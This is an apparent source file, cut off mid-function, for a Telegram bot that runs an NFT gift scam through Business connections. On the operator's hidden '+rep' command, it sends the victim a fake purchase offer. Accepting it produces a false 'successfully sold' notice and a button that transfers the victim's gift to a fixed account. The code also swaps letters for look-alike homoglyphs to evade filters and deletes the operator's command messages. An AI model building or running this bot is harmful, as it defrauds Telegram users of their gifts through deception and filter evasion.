import asyncio
import json
import logging
import os
import random
import re
import time
import uuid

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions,
    BusinessConnection,
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
ADMIN_ID = 8414654810
STAR_EMOJI_ID = "5242644275014951846"
GRAM_EMOJI_ID = "5193179982775476271"
CHECK_EMOJI_ID = "5776375003280838798"
CROSS_EMOJI_ID = "5778527486270770928"
GIFT_EMOJI_ID = "5985472565508838112"

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN is required")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

offers = {}
last_send = 0
SEND_COOLDOWN = 30

CONNECTIONS_FILE = "connections.json"
connections = {}

def load_connections():
    global connections
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                connections = json.load(f)
            print(f"[CONN] loaded {len(connections)} connections")
        except Exception as e:
            print(f"[CONN] load failed: {e}")
            connections = {}

def save_connections():
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, ensure_ascii=False)
    except Exception as e:
        print(f"[CONN] save failed: {e}")

load_connections()

@dp.business_connection()
async def on_business_conn(conn: BusinessConnection):
    connections[conn.id] = {
        "first_name": conn.user.first_name or "",
        "last_name": conn.user.last_name or "",
        "username": conn.user.username or "",
        "user_id": conn.user.id,
    }
    save_connections()
    print(f"[BIZ] conn={conn.id} name={conn.user.first_name} @{conn.user.username}")

def get_buyer_name(conn_id: str) -> str:
    data = connections.get(conn_id, {})
    return data.get("first_name") or "User"

def format_amount(value: str) -> str:
    try:
        num = int(value)
        return f"{num:,}"
    except ValueError:
        return value

def mask_stars(currency: str) -> str:
    if currency.lower() == "stars":
        return "Ѕtаrѕ"
    return currency.capitalize()

CYR_TO_LAT = {
    "а": "a", "е": "e", "о": "o", "р": "p", "с": "c", "х": "x", "у": "y",
    "А": "A", "Е": "E", "О": "O", "Р": "P", "С": "C", "Х": "X", "У": "Y",
    "і": "i", "І": "I",
}

def smart_randomize(text: str) -> str:
    probability = random.uniform(0.25, 0.55)
    result = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] == "<":
            end = text.find(">", i)
            if end != -1:
                result.append(text[i:end + 1])
                i = end + 1
                continue
        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
            end = i
            while end < n and text[end] not in " \n\t<>":
                end += 1
            result.append(text[i:end])
            i = end
            continue
        if text[i] == "@":
            end = i + 1
            while end < n and (text[end].isalnum() or text[end] == "_"):
                end += 1
            result.append(text[i:end])
            i = end
            continue
        if text[i:i+2] == "@@" and i + 2 < n:
            end = text.find("@@", i + 2)
            if end != -1:
                result.append(text[i:end + 2])
                i = end + 2
                continue

        char = text[i]
        if char in CYR_TO_LAT and random.random() < probability:
            result.append(CYR_TO_LAT[char])
        else:
            result.append(char)
        i += 1
    return "".join(result)

def gift_emoji() -> str:
    return f'<tg-emoji emoji-id="{GIFT_EMOJI_ID}">🎁</tg-emoji>'

def check_emoji() -> str:
    return f'<tg-emoji emoji-id="{CHECK_EMOJI_ID}">✔️</tg-emoji>'

def cross_emoji() -> str:
    return f'<tg-emoji emoji-id="{CROSS_EMOJI_ID}">❌</tg-emoji>'

SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")

def parse_nft_input(arg: str):
    arg = arg.strip()
    if "t.me/nft/" in arg or "telegram.me/nft/" in arg:
        slug = arg.rstrip("/").split("/")[-1]
    else:
        slug = arg
    m = SLUG_RE.match(slug)
    if not m:
        raise ValueError("bad slug")
    name_raw = m.group(1)
    num = int(m.group(2))
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_raw)
    name = name.replace("-", " ").replace("_", " ")
    nft_url = f"https://t.me/nft/{slug}"
    return name, num, nft_url

TEXTS = {
    "ru": {
        "offer_template": "Пользователь <b>{buyer}</b> предлагает Вам <b>{amount}</b> за подарок <b>{nft_link}.</b>",
        "offer_expires": "Предложение действует ещё <b>5ч 59м.</b>",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать",
        "declined": "Вы отклонили предложение",
    },
    "us": {
        "offer_template": "User <b>{buyer}</b> offers You <b>{amount}</b> for gift <b>{nft_link}.</b>",
        "offer_expires": "Offer valid for <b>5h 59m.</b>",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Send gift",
        "declined": "You have declined the offer",
    },
    "ua": {
        "offer_template": "Користувач <b>{buyer}</b> пропонує Вам <b>{amount}</b> за подарунок <b>{nft_link}.</b>",
        "offer_expires": "Пропозиція діє ще <b>5г 59хв.</b>",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати",
        "declined": "Ви відхилили пропозицію",
    },
}

def get_lang(code: str) -> str:
    if not code:
        return "ru"
    c = code.strip().lower()
    if c in ("en", "us"):
        return "us"
    return c if c in TEXTS else "ru"

def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_decline"],
                callback_data=f"decline_{order_id}",
                icon_custom_emoji_id=CROSS_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=t["btn_accept"],
                callback_data=f"accept_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            ),
        ]
    ])

def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=TEXTS[lang]["btn_transfer"],
                url=NFT_TRANSFER_LINK
            )
        ]
    ])

@dp.business_message(F.text.startswith("+rep "))
async def cmd_rep_business(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    global last_send
    now = time.time()
    if now - last_send < SEND_COOLDOWN:
        print(f"[FLOOD] skipped, cooldown {SEND_COOLDOWN}s")
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception:
            pass
        return
    last_send = now

    args = message.text.split()
    if len(args) < 3:
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception:
            pass
        return

    nft_arg = args[1]
    amount = args[2]
    currency = args[3].strip().lower() if len(args) > 3 else "stars"
    lang = get_lang(args[4] if len(args) > 4 else "ru")

    try:
        nft_name, nft_num, nft_url = parse_nft_input(nft_arg)
        nft_num_formatted = format_amount(str(nft_num))
        nft_full_name = f"{nft_name} #{nft_num_formatted}"
    except ValueError:
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception:
            pass
        return

    t = TEXTS[lang]
    amount_formatted = format_amount(amount)
    currency_text = mask_stars(currency)

    order_id = f"TG-{uuid.uuid4().hex[:10].upper()}"

    offers[order_id] = {
        "order_id": order_id,
        "nft_url": nft_url,
        "nft_name": nft_full_name,
        "amount": amount_formatted,
        "currency": currency,
        "lang": lang,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
        "chat_id": message.chat.id,
    }

    buyer_name = get_buyer_name(message.business_connection_id)

    offer_text_raw = t['offer_template'].format(
        buyer="@@BUYER@@",
        amount="@@AMOUNT@@",
        nft_link="@@NFT@@",
    )

    offer_text_rand = smart_randomize(offer_text_raw) if lang in ("ru", "ua") else offer_text_raw
    nft_name_rand = nft_full_name
    expires_text = smart_randomize(t['offer_expires']) if lang in ("ru", "ua") else t['offer_expires']

    nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'

    offer_text = (
        offer_text_rand
        .replace("@@BUYER@@", buyer_name)
        .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
        .replace("@@NFT@@", nft_link)
    )

    preview_line = f'<a href="{nft_url}">&#8203;</a>'
    text = f"{preview_line}{offer_text}\n\n{expires_text}"

    try:
        await message.answer(
            text=text,
            reply_markup=get_offer_keyboard(order_id, lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                show_above_text=True,
                prefer_large_media=True,
            ),
            parse_mode="HTML"
        )
        print(f"[OFFER] sent lang={lang}")
    except Exception as e:
        print(f"[SEND ERROR] {e}")

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass

@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer()
        return

    offer["status"] = "accepted"
    lang = offer["lang"]
    currency_text = mask_stars(offer['currency'])
    nft_name_rand = offer['nft_name']

    alert_texts = {
        "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
        "us": f"Offer to sell {offer['nft_name']} has been successfully accepted.\n\nTransfer the gift to the buyer to receive {offer['amount']} {currency_text} to your balance.",
        "ua": f"Пропозицію щодо продажу {offer['nft_name']} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {offer['amount']} {currency_text} на ваш баланс."
    }
    await callback.answer(alert_texts.get(lang, alert_texts["ru"]), show_alert=True)

    nft_link = f'<a href="{offer["nft_url"]}">{nft_name_rand}</a>'
    preview_line = f'<a href="{offer["nft_url"]}">&#8203;</a>'

    if lang == "ru":
        text = (
            f"{preview_line}{gift_emoji()} Подарок: <b>{nft_link}</b> успешно продан!\n\n"
            f"• <b>Передайте подарок покупателю для зачисления "
            f"{currency_text}.</b>"
        )
    elif lang == "ua":
        text = (
            f"{preview_line}{gift_emoji()} Подарунок: <b>{nft_link}</b> успішно продано!\n\n"
            f"• <b>Передайте подарунок покупцю для зарахування "
            f"{currency_text}.</b>"
        )
    else:
        text = (
            f"{preview_line}{gift_emoji()} Gift: <b>{nft_link}</b> successfully sold!\n\n"
            f"• <b>Transfer the gift to the buyer to receive "
            f"{currency_text}.</b>"
        )

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            business_connection_id=callback.message.business_connection_id,
            text=text,
            reply_markup=get_deal_keyboard(order_id, lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                show_above_text=True,
                prefer_large_media=True
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[EDIT ERROR] {e}")

@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)

    if not offer or offer["status"] != "pending":
        await callback.answer()
        return

    offer["status"] = "declined"
    lang = offer["lang"]
    t = TEXTS[lang]

    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else t['declined']
    text = f"{cross_emoji()} {declined_rand}"

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            business_connection_id=callback.message.business_connection_id,
            text=text,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
